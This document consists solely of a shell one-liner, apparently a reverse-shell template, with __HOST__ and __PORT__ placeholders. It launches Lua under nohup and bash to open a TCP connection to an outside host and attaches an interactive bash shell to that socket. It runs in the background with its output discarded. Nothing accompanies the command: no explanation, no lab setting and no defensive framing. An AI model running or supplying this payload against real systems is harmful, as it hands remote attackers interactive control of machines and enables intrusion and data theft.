/usr/bin/nohup /bin/bash -c 'lua -e "require('\''socket'\'');require('\''os'\'');t=socket.tcp();t:connect('\''__HOST__'\'','\''__PORT__'\'');os.execute('\''/bin/bash -i <&3 >&3'\'');"' >/dev/null &